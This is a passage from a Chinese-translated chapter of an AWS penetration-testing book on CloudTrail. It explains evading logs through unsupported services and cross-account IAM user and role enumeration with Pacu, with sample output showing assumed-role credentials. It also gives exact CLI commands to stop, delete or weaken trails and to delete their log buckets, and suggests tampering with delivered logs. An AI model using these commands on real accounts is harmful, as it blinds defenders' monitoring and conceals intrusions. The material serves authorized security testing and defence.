    "recipientAccountId": "000000000000"
}
```

甚至仅从这一个事件中，我们就可以收集到关于用户和环境的大量信息。我们可以看到的第一件事是，这个 API 调用是由一个 IAM 用户进行的，还有用户 ID、ARN、账户 ID、使用的访问密钥 ID、用户名以及他们是否进行了 MFA 身份验证的列表。此外，`invokedBy`键的值为`signin.amazonaws.com`，这告诉我们他们在执行此操作时已经登录到 AWS Web 控制台，而不是使用 CLI。然后我们可以看到有关请求本身的信息，包括事件是什么，该事件是为哪个服务发生的，事件发生的时间，以及请求中包含的一些参数。之后，我们可以看到 API 在响应中返回的参数，这些参数告诉我们一些关于新创建的 CloudTrail trail 的信息。

我们忽略的两个最重要的事情包括请求的来源 IP 地址和请求使用的用户代理。IP 地址将告诉我们呼叫来自何处，并且在更大的样本集中可能允许我们确定用户的工作地点，办公室的 IP 地址等。例如，如果我们看到多个用户在工作时间（上午 9 点至下午 5 点）从同一个 IP 地址发起，那么可以安全地假设他们都在办公室或者在使用 AWS API 时都在 VPN 上。然后我们知道，如果其中一个用户开始从我们以前没有见过的外部 IP 地址发起请求，那将是奇怪的，因此我们可以围绕这一点制定我们的攻击计划，试图避免这种情况。

用户代理也是一样的。在前面的示例事件中，用户代理是`signin.amazonaws.com`，这是在使用 AWS Web 控制台时出现的用户代理。如果我们看一个不同的事件，比如当我们使用 AWS CLI 中的`GetEventSelectors` API 时，我们可以看到用户代理更加具体：

```
{
    "eventVersion": "1.06",
    "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDARACQ1TW2RMLLAQFTX",
        "arn": "arn:aws:iam::000000000000:user/TestUser",
        "accountId": "000000000000",
        "accessKeyId": "AKIAFGVRRHYEFLLDHVVEA",
        "userName": "TestUser"
    },
    "eventTime": "2018-12-28T20:57:17Z",
    "eventSource": "cloudtrail.amazonaws.com",
    "eventName": "GetEventSelectors",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "1.1.1.1",
    "userAgent": "aws-cli/1.16.81 Python/3.7.0 Windows/10 botocore/1.12.71",
    "requestParameters": {
        "trailName": "ExampleTrail"
    },
    "responseElements": null,
    "requestID": "f391ba17-519x-423r-8b1t-16488a26b02p",
    "eventID": "562b2177-1ra0-2561-fjm0-3f1app6ac375",
    "readOnly": true,
    "eventType": "AwsApiCall",
    "managementEvent": true,
    "recipientAccountId": "000000000000"
}
```

这个请求的用户代理设置为`aws-cli/1.16.81 Python/3.7.0 Windows/10 botocore/1.12.71`，这为我们提供了关于用户使用的系统的大量信息。我们可以看到他们使用了 AWS CLI 的 1.16.81 版本，使用的是 Python 3.7.0 版本，在 Windows 10 上，并且使用了 botocore 库的 1.12.71 版本。这些信息本身就让我们了解到可能在我们目标公司使用的系统，同时也让我们能够收集环境中已知用户代理的列表。有了这个列表，我们可以伪装自己的用户代理，使其看起来像一个已知的用户代理，这样我们在 API 请求中就不会显得异常。

通过查看 CloudTrail 日志/事件历史，您可以做很多事情，包括我们之前进行的少量信息收集。您还可以根据对这些服务的 API 调用来确定账户中正在使用的 AWS 服务，并且可能发现有关账户中特定资源的有用信息。例如，假设您没有`ec2:DescribeInstances`权限，但您有`ec2:ModifyInstance`权限。理论上，您将无法获取 EC2 实例的列表，然后使用`ec2:ModifyInstance`API，因为您没有访问权限，但您可以查看 CloudTrail 日志，查找过去有人与 EC2 实例交互的事件。该事件可能包括实例 ID 和可能对您在发现环境中的资产有帮助的其他信息。

事件历史并不是查找这些信息的唯一地方，因为如果您具有必要的 S3 和 KMS 权限，您可以直接从它们交付的 S3 存储桶中下载日志，这比事件历史 API 的输出更快、更容易解析。但要小心不要触发任何警报，因为该存储桶内的活动可能正在被监视，从中下载文件的一系列请求可能会对防御者看起来可疑。

# 绕过日志记录

现在我们将绕过 CloudTrail 来发现您已经获得访问权限的账户的信息。第一种方法使用 CloudTrail 不支持的服务来收集基本账户信息，第二种方法使用其中一些信息来枚举账户中的 IAM 资源，而不会在目标账户中生成 CloudTrail 日志。

# 攻击者和防御者的不受支持的 CloudTrail 服务

正如我们在本章前面提到的，CloudTrail 并不记录所有内容，包括许多完全不受支持的服务。同样，不受支持服务的列表可以在这里找到：[`docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html`](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)。这意味着我们对这些服务的 API 调用将不会被 CloudTrail 记录在任何地方（包括事件历史！）。其中一些服务对我们作为攻击者可能非常有利，因此如果您攻破了某个用户并发现他们可以访问其中任何服务，那么值得检查，因为您可以保持低调并获得巨大利益。另一个关于不受支持的 CloudTrail 服务的重要一点是，这意味着您无法为这些 API 操作创建 CloudWatch 事件规则，这意味着您无法立即响应这些服务中发生的事件。

作为攻击者，如果我们正在寻找计算资源，我们可以滥用一些不同的未记录服务。在撰写本文时，AppStream 2.0、Amplify 和 Cloud9 都以某种方式为我们提供了对托管的 EC2 服务器的访问权限。这意味着我们可以启动服务器并与其交互，而不会被记录。

作为防御者，重要的是确保除非必要，否则没有用户可以访问这些服务。如果需要提供对任何未记录服务的访问权限，那么利用服务可能提供的任何内置日志，并利用 IAM 提供的其他一些功能来监视此访问。如果您下载 IAM 凭证报告，您可以通过查看`access_key_1_last_used_service`和`access_key_2_last_used_service`列来查看服务最近是否被访问，那些未记录的服务仍然会显示出来。要获取 IAM 凭证报告，您可以运行以下命令：

```
aws iam get-credential-report 
```

另一个选择是使用 IAM 的`GenerateServiceLastAccessedDetails`和`GetServiceLastAccessDetails`API 来确定用户何时/是否访问了某个服务，包括 CloudTrail 未记录的服务。为此，我们可以首先运行生成命令来生成报告：

```
aws iam generate-service-last-accessed-details --arn arn:aws:iam::000000000000:user/TestUser 
```

ARN 参数的值必须是 IAM 资源的 ARN，包括用户、组、角色和托管策略。这个 API 命令应该会返回一个`JobId`给你。然后我们可以使用那个 ID 来获取报告：

```
aws iam get-service-last-accessed-details --job-id frt7ll81-9002-4371-0829-35t1927k30w2 
```

该命令的响应将包括有关资源是否已经对某个服务进行了身份验证以及上次身份验证发生的时间的信息。这些 API 不会告诉你正在进行的确切活动，但至少可以检查谁正在尝试访问这些服务。

这些 API 还有助于检测未记录的 CloudTrail 服务用于账户枚举。Wired 公司发布了一篇关于 Rhino Security Labs 研究的文章，该研究涉及一种方法，基本上允许攻击者使用密钥收集少量 AWS 账户信息，而不会被 CloudTrail 记录（https://www.wired.com/story/aws-honeytoken-hackers-avoid/）。这项研究之所以如此重要，是因为有许多金丝雀令牌服务依赖于 CloudTrail，在密钥被泄露时发出警报。金丝雀令牌通常放置在环境中的某个地方，并设置为在使用时触发警报，这将表明攻击者在环境中并找到了这些令牌。对于 AWS，金丝雀令牌提供商通常依赖于 CloudTrail 来发出这些警报，但 Rhino Security Labs 表明可以绕过这些警报，并确定 AWS 密钥是否为金丝雀令牌，同时保持低调。

当时发现，一些最受欢迎的 AWS 金丝雀令牌提供商使用单个账户生成这些密钥，或者在指示它们正在被用作金丝雀令牌的用户中包含识别信息。这些信息可以通过从不受支持的 CloudTrail 服务返回的冗长错误消息中暴露出来，从而允许攻击者根据账户 ID 或用户名/路径来识别 AWS 密钥是否为金丝雀令牌，而不会触发密钥本来应该触发的警报。Atlassian 的`SpaceCrab`项目就是这种攻击的一个受害者。

最初，默认的`SpaceCrab`设置将 IAM 用户的路径设置为`/SpaceCrab/`。然后，攻击者可以针对不受支持的 CloudTrail 服务运行 AWS CLI 命令，用户的 ARN 将在错误消息中被披露。ARN 包括用户的路径，因此很明显这些密钥是由`SpaceCrab`创建的金丝雀令牌。以下是在运行 AppStream `DescribeFleets`命令时返回的示例错误消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c581e8bf-a547-4728-a25b-5454b0553d85.png)

图 5：IAM 用户路径包含 SpaceCrab，透露了它们是金丝雀令牌

该问题已报告给 Atlassian 并得到解决。问题也报告给了 AWS 本身，但被拒绝，因为他们不认为 ARN 是敏感信息。这是正确的，但用户不应该能够在不生成任何日志的情况下获取这些信息。

AWS Amplify 是另一个在 CloudTrail 中不受支持的较新的服务，它输出类似的冗长错误消息。在尝试运行`ListApps`命令而没有正确权限时返回了以下消息：

```
An error occurred (AccessDeniedException) when calling the ListApps operation: User: arn:aws:iam::000000000000:user/TestUser is not authorized to perform: amplify:ListApps on resource: arn:aws:amplify:us-west-2:000000000000:apps/* 
```

如果 AWS 服务输出类似的错误消息，并且有一些 CloudTrail 不支持的服务，这种小型攻击基本上是永恒的。同样的攻击可能适用于任何新发布的并且未被记录的服务。

即使这么少的信息对攻击者也有帮助，因为他们可以使用其他未记录的攻击向量，例如跨账户 IAM 用户/角色枚举，来收集更多信息（[`rhinosecuritylabs.com/aws/aws-iam-user-enumeration/`](https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/)）。

# 通过跨账户方法绕过日志记录

正如我们刚才指出的，可以在 AWS 账户中枚举用户和角色，而无需目标账户中的任何权限或日志。我们需要的一切就是我们自己的 AWS 账户和我们目标的 AWS 账户 ID。

# 枚举用户

就像我们之前在 IAM 章节中介绍的那样，IAM 角色有一个信任策略文档，指定了哪些 IAM 资源/账户可以从中请求临时凭证。在幕后，所有 IAM 资源都是唯一创建的，IAM 角色信任策略也认可这一点。这样做的原因是，如果您指定用户`Mike`可以假定某个角色，然后删除`Mike`；理论上，攻击者可以创建另一个名为`Mike`的 IAM 用户并假定该角色。实际上，情况并非如此，因为在幕后，角色信任策略引用的是唯一用户 ID，而不仅仅是用户名。

由于在幕后将用户 ARN 转换为唯一用户 ID，IAM 不会允许您设置允许访问不存在用户的信任策略。此外，角色可以被假定为跨账户，因此可以在信任策略中指定其他账户 ID。

鉴于这两个事实，如果作为攻击者，我们拥有另一个账户的账户 ID，我们基本上可以暴力破解其账户中存在哪些用户。这个过程已经在一个名为`iam__enum_users`的 Pacu 模块中自动化。使用 Pacu 打开并配置后，我们可以运行以下命令来枚举具有 ID`000000000000`的账户中的 IAM 用户：

```
run iam__enum_users --account-id 000000000000 --role-name TestRole 
```

`TestRole`是在我的账户中创建的 IAM 角色。Pacu 使用该角色来更新信任策略文档以进行枚举，因此很重要的是使用您自己的 AWS 访问密钥运行此模块，并提供具有更新访问权限的角色名称。

运行该模块时，您自己的 AWS CloudTrail 日志将被`iam:UpdateAssumeRolePolicy`日志淹没，但目标账户将看不到任何东西，从而允许您悄悄地收集有关目标环境的信息。

使用自定义单词列表，我们能够从 ID 为`000000000000`的目标账户中枚举出两个用户`Alexa`和`Test`（这只是一个演示，对您没有用，因为`000000000000`不是真实的 AWS 账户）。Pacu 模块的输出看起来像这样：

```
Pacu (Demo:imported-default) > run iam__enum_users --account-id 000000000000 --role-name TestRole
  Running module iam__enum_users...
[iam__enum_users] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!

[iam__enum_users] Targeting account ID: 000000000000

[iam__enum_users] Starting user enumeration...

[iam__enum_users]   Found user: arn:aws:iam::000000000000:user/Alexa
[iam__enum_users]   Found user: arn:aws:iam::000000000000:user/Test

[iam__enum_users] Found 2 user(s):

[iam__enum_users]     arn:aws:iam::000000000000:user/Alexa
[iam__enum_users]     arn:aws:iam::000000000000:user/Test

[iam__enum_users] iam__enum_users completed.

[iam__enum_users] MODULE SUMMARY:

  2 user(s) found after 7 guess(es).
```

输出显示，从我们修改后的单词列表中的七次猜测中找到了两个有效用户。在撰写本文时，Pacu 使用的默认单词列表有 1,136 个名称。

# 枚举角色

以前可以使用类似的攻击来枚举另一个 AWS 账户中存在的角色，如果只需要 AWS 账户 ID，那么我们基本上可以暴力破解所有存在的角色。由于 Rhino Security Labs 发布后，AWS 已经修改了 STS `AssumeRole` API 调用从 API 返回的错误消息，这意味着不再可能使用这种方法确定角色是否存在。`iam__enum_assume_role` Pacu 模块旨在利用此功能，但由于此更改，它不再起作用。

另一方面，发现了一种新方法，允许您跨账户基础上枚举角色。这种方法与用于枚举跨账户用户的方法相同。最初，这种方法的工作方式与现在不同，但必须进行了一些 API 更改，现在使得这种枚举成为可能。编写了一个新的 Pacu 模块来滥用这种攻击向量，它被命名为`iam__enum_roles`。它的工作方式与`iam__enum_users`模块完全相同，因此可以使用基本相同的命令运行：

```
 run iam__enum_roles --account-id 000000000000 --role-name TestRole 
```

该模块将枚举目标帐户中存在的角色，然后尝试假定这些角色以检索临时凭证，如果其策略配置错误并允许您访问。该模块的一部分如下：

```
Pacu (Spencer:imported-default) > run iam__enum_roles --account-id 000000000000 --role-name TestRole 
  Running module iam__enum_roles... 
[iam__enum_roles] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they 
are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name and are allowed to use sts:AssumeRole to try and assume any enumerated roles! 

[iam__enum_roles] Targeting account ID: 000000000000 

[iam__enum_roles] Starting role enumeration... 

[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/service-role/AmazonAppStreamServiceAccess 
[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/CodeDeploy 
[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/SSM 

[iam__enum_roles] Found 3 role(s): 

[iam__enum_roles]     arn:aws:iam::000000000000:role/service-role/AmazonAppStreamServiceAccess 
[iam__enum_roles]     arn:aws:iam::000000000000:role/CodeDeploy 
[iam__enum_roles]     arn:aws:iam::000000000000:role/SSM 

[iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials... 

[iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour... 

[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::000000000000:role/CodeDeploy 

[iam__enum_roles] { 
  "Credentials": { 
    "AccessKeyId": "ASIATR17AL2P90OB3U6Z", 
    "SecretAccessKey": "nIll8wr/T60pbbeIY/hkqRQlC9njUzv3RKO3qznT", 
    "SessionToken": "FQoGAR<snip>iC/aET", 
    "Expiration": "2019-01-16 20:32:08+00:00" 
  }, 
  "AssumedRoleUser": { 
    "AssumedRoleId": "AROAJ9266LEYEV7DH1LLK:qw9YWcRjmAiunsp3KhHM", 
    "Arn": "arn:aws:sts::000000000000:assumed-role/CodeDeploy/qw9YWcRjmAiunsp3KhHM" 
  } 
} 
[iam__enum_roles] iam__enum_roles completed. 

[iam__enum_roles] MODULE SUMMARY: 

  3 role(s) found after 8 guess(es). 
  1 out of 3 enumerated role(s) successfully assumed. 
```

前面的例子显示了找到了一些角色，并且其中一个角色配置错误，允许我们请求其凭证。在撰写本文时，Pacu 使用了 1,136 个名称的默认单词列表。

用户和角色枚举基本上是永恒的，例如冗长的 AWS CLI 错误消息，因为它是在利用预期的功能，而不是 API 中的任何错误。

# 破坏跟踪

有许多方法可以破坏 CloudTrail 跟踪的记录，以尝试在我们的攻击中保持低调，但它们都很可能触发警报，从而暴露我们的活动给关注的人。然而，了解这些方法仍然很重要，因为我们攻击的每个帐户可能甚至没有最基本的监控功能（如 GuardDuty），因此在这种情况下禁用任何 CloudTrail 记录是有意义的。然而，这个问题有部分解决方案；这些解决方案及其局限性将在本节末讨论。

# 关闭记录

破坏 CloudTrail 记录的一种简单方法是简单地关闭任何活动的跟踪。有一个专门用于此目的的 API，即`StopLogging` API。从 AWS CLI，我们可以使用以下命令关闭我们帐户中名为`test`的跟踪的记录：

```
aws cloudtrail stop-logging --name test 
```

此命令必须从创建目标跟踪的区域运行，否则将返回`InvalidHomeRegionException`错误。

这个任务也可以通过`detection__detection` Pacu 模块完成。该 Pacu 命令看起来可能是这样的：

```
 run detection__disruption --trails test@us-east-1 
```

然后会提示您选择四个不同的选项：禁用、删除、最小化或跳过。要停止跟踪的记录，我们将选择禁用（dis）。然后 Pacu 将禁用目标跟踪的记录。

GuardDuty 的更多信息可以在下一章中找到。

无论哪种情况，如果 GuardDuty 正在运行，它将触发一个`Stealth:IAMUser/CloudTrailLoggingDisabled`警报（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2)），表明已禁用了一个跟踪。这将暴露我们对环境的未经授权访问，并且如果有人在意的话，可能会关闭我们的攻击。

# 删除跟踪/S3 存储桶

另一组避免`StopLogging` API 的选项是要么完全删除 CloudTrail 跟踪，要么删除它发送日志的 S3 存储桶。我们可以使用以下命令从 AWS CLI 中删除名为`test`的跟踪：

```
aws cloudtrail delete-trail --name test 
```

这也可以通过 Pacu 完成，通过运行我们之前用于禁用跟踪的相同命令，但选择删除（del）选项：

```
run detection__disruption --trails test@us-east-1 
```

一旦提示要对跟踪执行什么操作，我们将选择`del`，这将随后完全删除 CloudTrail，意味着记录已停止。

我们还可以删除某个跟踪正在将其日志发送到的 S3 存储桶，这将阻止活动跟踪记录任何内容。这可以完全避免 CloudTrail API（如果您知道要删除的存储桶），但仍然非常嘈杂，因为它会使跟踪处于错误状态。如果我们还不知道，我们可以使用 AWS CLI 识别跟踪正在发送日志的存储桶的名称，使用以下命令：

```
aws cloudtrail describe-trails 
```

然后我们将查看我们要定位的跟踪的`S3BucketName`键的值，我们将假设是`cloudtrail_bucket`。然后我们可以使用以下 AWS CLI 命令删除该 S3 存储桶：

```
aws s3api delete-bucket --bucket cloudtrail_bucket
```

现在，CloudTrail 将继续尝试将日志传送到该存储桶，但会失败，这意味着在删除存储桶的期间将不会写入任何日志。如果您已经知道正在被定位的存储桶，您将永远不需要运行任何 CloudTrail API 调用；只需要运行 S3 的`DeleteBucket`调用。目前没有 Pacu 模块可用于执行此任务（获取由跟踪定位的存储桶，然后删除它）。之后，您甚至可以继续在您自己的攻击者账户中创建该存储桶，并提供正确的跨账户写入权限；然后您将获得所有 CloudTrail 日志，而您的目标账户将无法访问它们。

与禁用跟踪、删除跟踪或其目标存储桶类似，在启用 GuardDuty 的情况下，将触发`Stealth:IAMUser/CloudTrailLoggingDisabled`警报（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2)），表明已删除跟踪或其存储桶。同样，这将暴露我们对环境的未经授权访问，并且如果有人在意的话，很可能会关闭我们的攻击。

# 最小化跟踪

在目标账户中避免禁用或删除的另一种选择是修改跟踪以最小化其记录的内容。例如，假设有一个名为`test`的跟踪，它为每个区域记录日志；它记录全局服务事件，启用日志文件验证，启用日志文件加密，并记录对账户中每个 S3 存储桶和 Lambda 函数的访问。

为了避免禁用或删除此跟踪，我们可以使用`UpdateTrail` API 来删除其设置的所有功能。我们可以运行以下 AWS CLI 命令来禁用全局服务事件，将其从全局跟踪更改为单区域跟踪，禁用日志文件加密和禁用日志文件验证：

```
aws cloudtrail update-trail --name test --no-include-global-service-events --no-is-multi-region-trail --no-enable-log-file-validation --kms-key-id "" 
```

通过将 KMS 密钥 ID 设置为空值，从那时起所有日志都将是未加密的。您还可以选择修改哪些设置，例如，如果您想要使用非全局 API 定位`us-west-2`区域，并且该跟踪是在`us-east-1`中创建的全局跟踪。在这种情况下，您只需要包括`--no-is-multi-region-trail`标志，并确保您保持在`us-west-2`中。如果跟踪正在向 SNS 主题发送通知，您还可以通过将主题设置为空字符串来禁用它。与跟踪相关的 CloudWatch 日志也是如此。

与禁用/删除跟踪类似，`detection__disruption` Pacu 模块将为您自动化此过程。我们可以运行相同的命令：

```
run detection__disruption --trails test@us-east-1 
```

然后在提示时，我们选择最小化（`m`）选项，这将删除任何关联的 SNS 主题，禁用全局服务事件，将其从全局跟踪更改为单区域跟踪，禁用日志文件验证，删除与 CloudWatch 日志组和相关角色的任何关联，并删除日志文件加密。

与禁用/删除跟踪类似，在启用了 GuardDuty 的情况下，这些修改类型有可能触发`Stealth:IAMUser/CloudTrailLoggingDisabled`（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2)）和/或`Stealth:IAMUser/LoggingConfigurationModified`（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth3`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth3)）警报，这可能最终导致我们在环境中被发现。在撰写本文时，我们从未看到 GuardDuty 对 CloudTrail 的此类攻击触发，尽管两种发现类型的描述似乎表明它们应该被触发，但目前尚不清楚是否一定会被检测到。

要修改追踪器的 S3 数据和 Lambda 调用事件设置，我们需要使用`PutEventSelectors` API 而不是`UpdateTrail`。我们可以修改事件选择器以删除任何数据事件（S3/Lambda）的选择器，因此这些事件将不再被追踪器记录。我们还可以修改`ReadWriteType`，指定追踪器是否应记录读取事件、写入事件或两者。修改为仅记录读取事件将很简单，这样我们恶意的写入事件就不会被记录。我们可以使用以下 AWS CLI 命令删除所有数据事件记录，仅记录读取事件：

```
aws cloudtrail put-event-selectors --trail-name Test --event-selectors file://event_selectors.json
```

在`event_selectors.json`中，我们将有以下内容：

```
[
    {
        "ReadWriteType": "ReadOnly",
        "IncludeManagementEvents": true,
        "DataResources": []
    }
]
```

这个 JSON 文档告诉 CloudTrail 只记录读取事件，并不记录任何数据事件（S3/Lambda）。一旦应用到追踪器上，它将记录缺少大部分故事的信息，使我们攻击者能够通过日志分析。

# 中断问题（以及一些部分解决方案）

对 CloudTrail 的这些攻击的主要问题在于 GuardDuty 旨在检测它们，但存在一些潜在的绕过方法，使我们能够在不被发现的情况下进行更改。

第一个最简单的绕过方法是检测您已经妥协的用户的常规活动是什么。GuardDuty 使用机器学习（更多内容请参阅第十六章，*GuardDuty*）来检测这些攻击是否异常，因此，如果您妥协了一个有着禁用/删除/修改 CloudTrail 追踪器历史记录的历史的用户，那么您可能也可以做同样的事情，而不被 GuardDuty 检测为异常。

另一个部分解决方案是在日志传送到其 S3 存储桶后修改日志。如果目标正确地在其追踪器上使用了日志文件验证设置，将能够检测到这一点，但如果没有，那么很容易进入日志传送的 S3 存储桶，然后修改日志以删除我们攻击者活动的任何痕迹。有多种方法可以用来防御这种攻击，但在您进行渗透测试时可能会在某个环境中实现。

需要记住的一件事是，在 S3 存储桶中删除/修改日志并不意味着 CloudTrail 事件历史记录中的日志也被删除/修改，因为这些日志将在那里不可变地保存 90 天。由于其速度和限制，CloudTrail 事件历史记录可能难以处理，因此在最坏的情况下（即防御者几乎立即调查您的活动），您仍然可以争取一些时间，以便他们能够适当地检查您的活动。

# 总结

在本章中，我们介绍了设置符合最佳实践的 CloudTrail 事件，以及如何审计目标环境的最佳实践。CloudTrail 并不是一个完美的服务，我们通过使用它不支持的服务来演示，可以在一个账户中执行侦察而不生成任何日志。因此，有必要跟踪 CloudTrail 中不支持的服务，以便在目标环境中利用它们，而不会在日志中显示。跨账户枚举方法还允许我们在不生成日志的情况下发现有关目标账户的信息，这意味着我们可以了解谁在使用环境，以及环境中使用了什么，而不需要使用被破坏的密钥进行 API 调用。我们还展示了如何使用 Pacu 自动化一些对 CloudTrail 的攻击，以及 GuardDuty 如何介入尝试检测这些行为。

在下一章中，我们将更深入地讨论 GuardDuty，重点关注它检测和标记的内容，以及我们如何绕过本章讨论的内容。这些绕过和对 GuardDuty 使用的检测方法的理解将使我们能够以强大的力量攻击环境，同时保持隐秘。
